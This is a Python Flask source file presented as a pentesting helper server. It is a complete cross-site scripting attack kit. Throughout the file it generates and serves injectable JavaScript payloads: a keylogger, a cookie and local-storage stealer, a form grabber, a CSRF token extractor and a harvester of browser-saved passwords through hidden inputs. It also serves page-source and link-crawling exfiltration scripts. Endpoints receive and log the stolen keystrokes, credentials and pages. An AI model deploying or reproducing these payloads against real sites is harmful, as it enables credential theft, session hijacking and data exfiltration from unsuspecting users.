from flask import Flask, request, send_from_directory, abort
from datetime import datetime
import argparse
import logging
import os
import socket

app = Flask(__name__)

# Add CORS headers to all responses for pentesting
@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
    return response

# Global variables for /key endpoint
key_sequence_active = False
key_values = []
key_timestamp = None
key_ip = None

# Global variables for server configuration
server_ip = None
server_port = None

def finalize_key_sequence():
    """Finalize and print the accumulated /key sequence"""
    global key_sequence_active, key_values, key_timestamp, key_ip
    if key_sequence_active and key_values:
        print()  # New line after accumulated values
        print("-" * 60)
        key_sequence_active = False
        key_values = []
        key_timestamp = None
        key_ip = None

def get_all_local_ips():
    """Get all local IP addresses (excluding 127.0.0.1) including VPN interfaces"""
    ip_addresses = []

    # Method 1: Try using netifaces if available (most reliable)
    try:
        import netifaces
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr_info in addrs[netifaces.AF_INET]:
                    ip = addr_info.get('addr')
                    if ip and ip != '127.0.0.1' and ip not in ip_addresses:
                        ip_addresses.append(ip)
        if ip_addresses:
            return ip_addresses
    except ImportError:
        pass
    except Exception:
        pass

    # Method 2: Platform-specific enumeration
    import platform
    system = platform.system()

    if system == 'Windows':
        # Use ipconfig on Windows
        try:
            import subprocess
            result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
            output = result.stdout

            # Parse ipconfig output for IPv4 addresses
            for line in output.split('\n'):
                if 'IPv4' in line and ':' in line:
                    ip = line.split(':')[1].strip()
                    # Remove any extra info in parentheses
                    if '(' in ip:
                        ip = ip.split('(')[0].strip()
                    # Validate it's a proper IP
                    parts = ip.split('.')
                    if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                        if ip != '127.0.0.1' and ip not in ip_addresses:
                            ip_addresses.append(ip)
        except Exception:
            pass

    elif system == 'Linux' or system == 'Darwin':
        # Use ip addr or ifconfig on Linux/Mac
        try:
            import subprocess
            import re

            # Try 'ip addr' first (modern Linux)
            try:
                result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
                output = result.stdout
                # Find all IPv4 addresses
                for match in re.finditer(r'inet (\d+\.\d+\.\d+\.\d+)', output):
                    ip = match.group(1)
                    if ip != '127.0.0.1' and ip not in ip_addresses:
                        ip_addresses.append(ip)
            except:
                # Fallback to ifconfig
                result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
                output = result.stdout
                for match in re.finditer(r'inet (\d+\.\d+\.\d+\.\d+)', output):
                    ip = match.group(1)
                    if ip != '127.0.0.1' and ip not in ip_addresses:
                        ip_addresses.append(ip)
        except Exception:
            pass

    # Method 3: Fallback to hostname-based lookup
    if not ip_addresses:
        try:
            hostname = socket.gethostname()
            for ip_info in socket.getaddrinfo(hostname, None):
                ip = ip_info[4][0]
                if ':' not in ip and ip != '127.0.0.1' and ip not in ip_addresses:
                    ip_addresses.append(ip)
        except Exception:
            pass

    # Method 4: Get primary IP via external connection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        primary_ip = s.getsockname()[0]
        s.close()
        if primary_ip not in ip_addresses and primary_ip != "127.0.0.1":
            ip_addresses.insert(0, primary_ip)  # Put primary IP first
    except Exception:
        pass

    return ip_addresses if ip_addresses else ["0.0.0.0"]

# JavaScript payload generators
def get_klogger_payload():
    """Keylogger payload - captures keypresses"""
    return f"""document.addEventListener('keydown', function(e) {{ fetch('http://{server_ip}:{server_port}/key?k=' + encodeURIComponent(e.key)); }});"""

def get_info_payload():
    """Info exfiltration payload - captures cookies, localStorage, etc."""
    return f"""fetch('http://{server_ip}:{server_port}/data', {{
  method: 'POST',
  headers: {{ 'Content-Type': 'application/json' }},
  body: JSON.stringify({{
    cookies: document.cookie,
    url: document.location.href,
    domain: document.domain,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  }})
}});"""

def get_formgrab_payload():
    """Form grabber payload - intercepts form submissions"""
    return f"""document.addEventListener('submit', function(e) {{
  e.preventDefault();
  var form = e.target;
  var formData = new FormData(form);
  var data = {{}};
  formData.forEach(function(value, key) {{
    data[key] = value;
  }});
  fetch('http://{server_ip}:{server_port}/data', {{
    method: 'POST',
    headers: {{ 'Content-Type': 'application/json' }},
    body: JSON.stringify({{
      type: 'form_submission',
      action: form.action,
      method: form.method,
      data: data
    }})
  }}).then(function() {{
    form.submit();
  }});
}}, true);"""

def get_csrf_payload():
    """CSRF token extractor payload"""
    return f"""(function() {{
  var tokens = {{}};

  // Check meta tags
  var metaTags = document.querySelectorAll('meta[name*="csrf"], meta[name*="token"]');
  metaTags.forEach(function(meta) {{
    tokens[meta.getAttribute('name')] = meta.getAttribute('content');
  }});

  // Check hidden inputs
  var hiddenInputs = document.querySelectorAll('input[type="hidden"][name*="csrf"], input[type="hidden"][name*="token"]');
  hiddenInputs.forEach(function(input) {{
    tokens[input.name] = input.value;
  }});

  // Check cookies for CSRF tokens
  var cookies = document.cookie.split(';');
  cookies.forEach(function(cookie) {{
    var parts = cookie.trim().split('=');
    if (parts[0].toLowerCase().includes('csrf') || parts[0].toLowerCase().includes('token')) {{
      tokens[parts[0]] = parts[1];
    }}
  }});

  fetch('http://{server_ip}:{server_port}/data', {{
    method: 'POST',
    headers: {{ 'Content-Type': 'application/json' }},
    body: JSON.stringify({{
      type: 'csrf_tokens',
      url: document.location.href,
      tokens: tokens
    }})
  }});
}})();"""

def get_savedcreds_payload():
    """Saved credentials extractor - captures browser-saved credentials"""
    return f"""let body = document.getElementsByTagName("body")[0]
var uname = document.createElement("input");
uname.type = "text";
uname.style.position = "fixed";
uname.style.opacity = "0";

var pwd = document.createElement("input");
pwd.type = "password";
pwd.style.position = "fixed";
pwd.style.opacity = "0";

body.append(uname)
body.append(pwd)

setTimeout(function(){{
  fetch("http://{server_ip}:{server_port}/data?uname=" + uname.value + "&pwd=" + pwd.value)
}}, 5000)"""

def get_combo_payload():
    """Combo payload - all-in-one (info + keylogger + formgrabber)"""
    return f"""(function() {{
  // 1. Send initial info
  fetch('http://{server_ip}:{server_port}/data', {{
    method: 'POST',
    headers: {{ 'Content-Type': 'application/json' }},
    body: JSON.stringify({{
      type: 'initial_info',
      cookies: document.cookie,
      url: document.location.href,
      domain: document.domain,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage)
    }})
  }});

  // 2. Install keylogger
  document.addEventListener('keydown', function(e) {{
    fetch('http://{server_ip}:{server_port}/key?k=' + encodeURIComponent(e.key));
  }});

  // 3. Install form grabber
  document.addEventListener('submit', function(e) {{
    e.preventDefault();
    var form = e.target;
    var formData = new FormData(form);
    var data = {{}};
    formData.forEach(function(value, key) {{
      data[key] = value;
    }});
    fetch('http://{server_ip}:{server_port}/data', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json' }},
      body: JSON.stringify({{
        type: 'form_submission',
        action: form.action,
        method: form.method,
        data: data
      }})
    }}).then(function() {{
      form.submit();
    }});
  }}, true);
}})();"""

def get_sourcecode_payload():
    """Source code exfiltration payload - conditionally exfiltrates page HTML based on query parameter"""
    # Check if the 'd' or 'u' parameter is set
    d_param = request.args.get('d', '')
    u_param = request.args.get('u', '')

    if d_param:
        # Exfiltrate to /data endpoint as JSON
        if d_param == 'self':
            # Exfiltrate current page
            return f"""(function() {{
  function exfiltrateSourceCode() {{
    fetch('http://{server_ip}:{server_port}/data', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json' }},
      body: JSON.stringify({{
        type: 'source_code',
        url: document.location.href,
        html: document.documentElement.outerHTML
      }})
    }});
  }}

  // Wait 2 seconds before exfiltrating to allow page to fully render
  setTimeout(exfiltrateSourceCode, 2000);
}})();"""
        else:
            # Fetch external URL and exfiltrate
            return f"""(function() {{
  function exfiltrateSourceCode() {{
    var targetUrl = '{d_param}';

    // Fetch the target URL
    fetch(targetUrl)
      .then(response => response.text())
      .then(html => {{
        // Send fetched HTML to data endpoint
        fetch('http://{server_ip}:{server_port}/data', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{
            type: 'source_code',
            url: targetUrl,
            html: html
          }})
        }});
      }})
      .catch(err => {{
        // Send error info
        fetch('http://{server_ip}:{server_port}/data', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{
            type: 'source_code_error',
            url: targetUrl,
            error: err.toString()
          }})
        }});
      }});
  }}

  // Wait 2 seconds before exfiltrating to allow page to fully render
  setTimeout(exfiltrateSourceCode, 2000);
}})();"""
    elif u_param:
        # Exfiltrate to /upload endpoint as raw HTML
        # Check for custom filename in 'n' parameter
        n_param = request.args.get('n', '')

        if u_param == 'self':
            # Exfiltrate current page
            if n_param:
                # Use custom filename from n parameter
                return f"""(function() {{
  function exfiltrateSourceCode() {{
    var filename = '{n_param}';

    // Send HTML to upload endpoint
    fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
      method: 'POST',
      body: document.documentElement.outerHTML
    }});
  }}

  // Wait 2 seconds before exfiltrating to allow page to fully render
  setTimeout(exfiltrateSourceCode, 2000);
}})();"""
            else:
                # Generate filename from URL pathname
                return f"""(function() {{
  function exfiltrateSourceCode() {{
    // Extract path from URL (exclude protocol and server)
    var url = new URL(document.location.href);
    var filename = url.pathname;

    // Remove leading slash and sanitize filename
    if (filename.startsWith('/')) {{
      filename = filename.substring(1);
    }}

    // If empty (root path), use index.html
    if (filename === '' || filename === '/') {{
      filename = 'index.html';
    }}

    // Replace slashes with underscores for nested paths
    filename = filename.replace(/\\//g, '_');

    // Send HTML to upload endpoint
    fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
      method: 'POST',
      body: document.documentElement.outerHTML
    }});
  }}

  // Wait 2 seconds before exfiltrating to allow page to fully render
  setTimeout(exfiltrateSourceCode, 2000);
}})();"""
        elif u_param == 'all':
            # Exfiltrate current page AND all linked pages
            return f"""(function() {{
  var usedFilenames = {{}};

  // Generate unique filename from URL
  function generateFilename(url) {{
    var urlObj = new URL(url);
    var pathname = urlObj.pathname;

    // Try to extract filename from pathname
    var parts = pathname.split('/');
    var lastPart = parts[parts.length - 1];

    var baseFilename;
    if (lastPart && lastPart.length > 0 && lastPart !== '/') {{
      // Use the last part of the path as filename
      baseFilename = lastPart;
    }} else {{
      // No filename in path, generate from pathname
      pathname = pathname.replace(/^\\//, '').replace(/\\/$/, '');
      if (pathname === '') {{
        baseFilename = 'index.html';
      }} else {{
        baseFilename = pathname.replace(/\\//g, '_') + '.html';
      }}
    }}

    // Ensure unique filename
    var filename = baseFilename;
    var counter = 1;
    while (usedFilenames[filename]) {{
      var dotIndex = baseFilename.lastIndexOf('.');
      if (dotIndex > 0) {{
        var name = baseFilename.substring(0, dotIndex);
        var ext = baseFilename.substring(dotIndex);
        filename = name + '_' + counter + ext;
      }} else {{
        filename = baseFilename + '_' + counter;
      }}
      counter++;
    }}

    usedFilenames[filename] = true;
    return filename;
  }}

  // Upload HTML content
  function uploadContent(url, html) {{
    var filename = generateFilename(url);
    fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
      method: 'POST',
      body: html
    }});
  }}

  function exfiltrateAll() {{
    // 1. Exfiltrate current page
    uploadContent(document.location.href, document.documentElement.outerHTML);

    // 2. Find all hyperlinks
    var links = document.querySelectorAll('a[href]');
    var urls = [];

    links.forEach(function(link) {{
      try {{
        var href = link.href;
        // Only process valid HTTP(S) URLs
        if (href && (href.startsWith('http://') || href.startsWith('https://'))) {{
          // Avoid duplicates
          if (urls.indexOf(href) === -1) {{
            urls.push(href);
          }}
        }}
      }} catch(e) {{
        // Ignore invalid URLs
      }}
    }});

    // 3. Fetch and exfiltrate each linked page
    urls.forEach(function(url, index) {{
      // Stagger requests to avoid overwhelming the browser
      setTimeout(function() {{
        fetch(url)
          .then(response => response.text())
          .then(html => {{
            uploadContent(url, html);
          }})
          .catch(err => {{
            // Silently ignore fetch errors (CORS, network, etc.)
          }});
      }}, index * 100); // 100ms delay between each fetch
    }});
  }}

  // Wait 2 seconds before starting exfiltration
  setTimeout(exfiltrateAll, 2000);
}})();"""
        else:
            # Fetch external URL and exfiltrate
            if n_param:
                # Use custom filename
                return f"""(function() {{
  function exfiltrateSourceCode() {{
    var targetUrl = '{u_param}';
    var filename = '{n_param}';

    // Fetch the target URL
    fetch(targetUrl)
      .then(response => response.text())
      .then(html => {{
        // Send fetched HTML to upload endpoint
        fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
          method: 'POST',
          body: html
        }});
      }})
      .catch(err => {{
        // Send error info to data endpoint
        fetch('http://{server_ip}:{server_port}/data', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{
            type: 'fetch_error',
            url: targetUrl,
            error: err.toString()
          }})
        }});
      }});
  }}

  // Wait 2 seconds before exfiltrating to allow page to fully render
  setTimeout(exfiltrateSourceCode, 2000);
}})();"""
            else:
                # Generate filename from target URL pathname
                return f"""(function() {{
  function exfiltrateSourceCode() {{
    var targetUrl = '{u_param}';

    // Fetch the target URL
    fetch(targetUrl)
      .then(response => response.text())
      .then(html => {{
        // Extract path from target URL (exclude protocol and server)
        var url = new URL(targetUrl);
        var filename = url.pathname;

        // Remove leading slash and sanitize filename
        if (filename.startsWith('/')) {{
          filename = filename.substring(1);
        }}

        // If empty (root path), use index.html
        if (filename === '' || filename === '/') {{
          filename = 'index.html';
        }}

        // Replace slashes with underscores for nested paths
        filename = filename.replace(/\\//g, '_');

        // Send fetched HTML to upload endpoint
        fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
          method: 'POST',
          body: html
        }});
      }})
      .catch(err => {{
        // Send error info to data endpoint
        fetch('http://{server_ip}:{server_port}/data', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{
            type: 'fetch_error',
            url: targetUrl,
            error: err.toString()
          }})
        }});
      }});
  }}

  // Wait 2 seconds before exfiltrating to allow page to fully render
  setTimeout(exfiltrateSourceCode, 2000);
}})();"""
    else:
        # No action if neither parameter is set
        return "// Source code exfiltration hook - add ?d=self|url (to /data) or ?u=self|all|url (to /upload, optional &n=filename)"

@app.route('/ping')
def ping():
    # Finalize any active /key sequence
    finalize_key_sequence()

    # Get the requester's IP address
    requester_ip = request.remote_addr

    # Get the current timestamp
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Display request information in console
    print(f"[{timestamp}] {requester_ip} - Received {request.method} request on /ping")
    print("-" * 60)

    # Return HTTP 200 with "ok"
    return "ok", 200

@app.route('/data', methods=['GET', 'POST'])
def data():
    # Finalize any active /key sequence
    finalize_key_sequence()

    requester_ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if request.method == 'GET':
        # Get query parameters
        query_params = request.args.to_dict()

        if query_params:
            print(f"[{timestamp}] {requester_ip} - Received GET request on /data")
            print(f"  Query parameters:")
            for key, value in query_params.items():
                print(f"    {key} = {value}")
            print("-" * 60)
        else:
            print(f"[{timestamp}] {requester_ip} - Received GET request on /data (no parameters)")
            print("-" * 60)

    elif request.method == 'POST':
        # Get query parameters
        query_params = request.args.to_dict()

        print(f"[{timestamp}] {requester_ip} - Received POST request on /data")

        # Display query parameters if any
        if query_params:
            print(f"  Query parameters:")
            for key, value in query_params.items():
                print(f"    {key} = {value}")

        # Display POST body data
        print(f"  POST body:")
        if request.is_json:
            # JSON data - display as key/value pairs
            json_data = request.get_json()
            if isinstance(json_data, dict):
                for key, value in json_data.items():
                    print(f"    {key} = {value}")
            else:
                # If JSON is not a dict (array, string, etc.), display it directly
                print(f"    {json_data}")
        elif request.files:
            # File upload
            for field_name, file in request.files.items():
                print(f"    File field: {field_name}")
                print(f"    Filename: {file.filename}")
                file_content = file.read().decode('utf-8', errors='replace')
                file.seek(0)  # Reset file pointer for potential further processing
                print(f"    Content:")
                print(f"    {file_content}")
        elif request.form:
            # Form data
            for key, value in request.form.items():
                print(f"    {key} = {value}")
        else:
            # Raw data
            body_data = request.get_data(as_text=True)
            if body_data:
                print(f"    {body_data}")
            else:
                print(f"    (empty)")

        print("-" * 60)

    return "", 200

@app.route('/key')
def key():
    global key_sequence_active, key_values, key_timestamp, key_ip

    requester_ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Get the 'k' parameter
    k_value = request.args.get('k', '')

    # Format special keys (multi-character) with brackets
    display_value = f"[{k_value}]" if len(k_value) > 1 else k_value

    # If this is the first /key request in the sequence
    if not key_sequence_active:
        key_sequence_active = True
        key_timestamp = timestamp
        key_ip = requester_ip
        key_values = [k_value]
        # Print the header and first value on the same line
        print(f"[{timestamp}] {requester_ip} - /key k={display_value}", end='', flush=True)
    else:
        # Append to existing sequence
        key_values.append(k_value)
        print(f"{display_value}", end='', flush=True)

    return "", 200

@app.route('/hooks')
@app.route('/hooks/<path:subpath>')
def hooks(subpath=None):
    # Finalize any active /key sequence
    finalize_key_sequence()

    # Map subpaths to payload generator functions with descriptions
    payloads = {
        'klog.js': {
            'function': get_klogger_payload,
            'description': 'Keylogger - captures keypresses'
        },
        'info.js': {
            'function': get_info_payload,
            'description': 'Info exfiltration - captures cookies, localStorage, sessionStorage'
        },
        'formgrab.js': {
            'function': get_formgrab_payload,
            'description': 'Form grabber - intercepts form submissions'
        },
        'csrf.js': {
            'function': get_csrf_payload,
            'description': 'CSRF token extractor - finds tokens in meta tags, inputs, cookies'
        },
        'savedcreds.js': {
            'function': get_savedcreds_payload,
            'description': 'Saved credentials extractor - captures browser-saved passwords'
        },
        'sourcecode.js': {
            'function': get_sourcecode_payload,
            'description': 'Source code exfiltration - captures page, fetches URL, or crawls links (?d=self|url, ?u=self|all|url&n=filename)'
        },
        'combo.js': {
            'function': get_combo_payload,
            'description': 'Combined payload - info + keylogger + formgrabber'
        }
    }

    # If no subpath, display available hooks
    if subpath is None:
        response = "Available JavaScript Payloads:\n"
        response += "=" * 60 + "\n\n"
        for filename, payload_info in payloads.items():
            response += f"/hooks/{filename}\n"
            response += f"  {payload_info['description']}\n"

            # Add detailed examples for sourcecode.js
            if filename == 'sourcecode.js':
                response += f"\n  Usage Examples:\n"
                response += f"    1. Exfiltrate current page to /data endpoint:\n"
                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?d=self\"></script>\n\n"
                response += f"    2. Fetch external URL and send to /data endpoint:\n"
                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?d=https://target.com/api/config\"></script>\n\n"
                response += f"    3. Exfiltrate current page to /upload (auto filename):\n"
                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?u=self\"></script>\n\n"
                response += f"    4. Exfiltrate current page to /upload (custom filename):\n"
                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?u=self&n=mypage.html\"></script>\n\n"
                response += f"    5. Fetch external URL and upload with custom filename:\n"
                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?u=https://target.com/data&n=data.json\"></script>\n\n"
                response += f"    6. Crawl and exfiltrate current page + ALL linked pages:\n"
                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?u=all\"></script>\n\n"
            else:
                response += f"  <script src=\"http://{server_ip}:{server_port}/hooks/{filename}\"></script>\n\n"
        return response, 200, {'Content-Type': 'text/plain'}

    # Check if requesting a known payload
    if subpath in payloads:
        script = payloads[subpath]['function']()
        return script, 200, {'Content-Type': 'application/javascript'}

    # Unknown subpath
    return "Hook not found", 404

@app.route('/api/<path:command>')
def api(command):
    # Finalize any active /key sequence
    finalize_key_sequence()

    requester_ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if command == 'clear':
        # Clear the console window
        import platform
        system = platform.system()

        if system == 'Windows':
            os.system('cls')
        else:
            # Linux/Mac/Unix
            os.system('clear')

        print(f"[{timestamp}] {requester_ip} - API: Console cleared")
        print("-" * 60)
        return "Console cleared", 200

    # Unknown API command
    print(f"[{timestamp}] {requester_ip} - API: Unknown command '{command}'")
    print("-" * 60)
    return f"Unknown API command: {command}", 404

@app.route('/upload/<path:filename>', methods=['POST'])
def upload(filename):
    # Finalize any active /key sequence
    finalize_key_sequence()

    requester_ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Get the current working directory
    current_dir = os.getcwd()
    file_path = os.path.join(current_dir, filename)

    try:
        # Get the POST data (raw bytes)
        file_data = request.get_data()

        # Write data to file (overwrites if exists)
        with open(file_path, 'wb') as f:
            f.write(file_data)

        # Log the upload
        print(f"[{timestamp}] {requester_ip} - Uploaded file '{filename}' ({len(file_data)} bytes)")
        print("-" * 60)

        return "File uploaded successfully", 200

    except Exception as e:
        # Log the error
        print(f"[{timestamp}] {requester_ip} - ERROR uploading file '{filename}': {str(e)}")
        print("-" * 60)
        return f"Upload failed: {str(e)}", 500

@app.route('/<path:filename>')
def serve_file(filename):
    # Finalize any active /key sequence
    finalize_key_sequence()

    requester_ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Get the current working directory
    current_dir = os.getcwd()
    file_path = os.path.join(current_dir, filename)

    # Check if file exists
    if os.path.isfile(file_path):
        print(f"[{timestamp}] {requester_ip} - Serving file '{filename}'")
        print("-" * 60)
        return send_from_directory(current_dir, filename)
    else:
        # Don't log error for favicon.ico (browsers request it automatically)
        if filename != 'favicon.ico':
            print(f"[{timestamp}] {requester_ip} - ERROR: File not found '{filename}'")
            print("-" * 60)
        abort(404)

if __name__ == '__main__':
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Helper web server for pentesting')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Port to listen on (default: 8080)')
    args = parser.parse_args()

    # Get all local IP addresses (excluding 127.0.0.1)
    all_ips = get_all_local_ips()

    # Select the IP to use
    if len(all_ips) > 1:
        print("Multiple network interfaces detected:")
        for idx, ip in enumerate(all_ips, 1):
            print(f"  {idx}. {ip}")
        print()

        while True:
            try:
                choice = input(f"Select IP to use for payload's (1-{len(all_ips)}): ").strip()
                choice_idx = int(choice) - 1
                if 0 <= choice_idx < len(all_ips):
                    selected_ip = all_ips[choice_idx]
                    break
                else:
                    print(f"Invalid choice. Please enter a number between 1 and {len(all_ips)}.")
            except ValueError:
                print("Invalid input. Please enter a number.")
            except KeyboardInterrupt:
                print("\nExiting...")
                exit(0)
    else:
        selected_ip = all_ips[0]

    # Set global variables for use in endpoints
    globals()['server_ip'] = selected_ip
    globals()['server_port'] = args.port

    print()
    print(f"Starting web server on http://0.0.0.0:{args.port}")
    print(f"Selected attacker IP: {selected_ip}")
    print()
    print("Available Endpoints:")
    print("-" * 60)
    print(f"  /ping                   - Health check (returns HTTP 200 'ok')")
    print(f"  /data                   - Receives exfiltrated data (GET/POST)")
    print(f"  /key                    - Keylogger receiver (accumulates keystrokes)")
    print(f"  /hooks                  - Lists available JavaScript payloads")
    print(f"  /hooks/<payload.js>     - Serves specific JavaScript payload")
    print(f"  /upload/<filename>      - File upload endpoint (POST)")
    print(f"  /api/<command>          - Server control API (e.g., /api/clear to clear console)")
    print(f"  /<path>                 - Serves files from current directory")
    print()
    print("Press CTRL+C to stop")
    print("=" * 60)

    # Disable Flask's default request logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    app.run(host='0.0.0.0', port=args.port, debug=False)
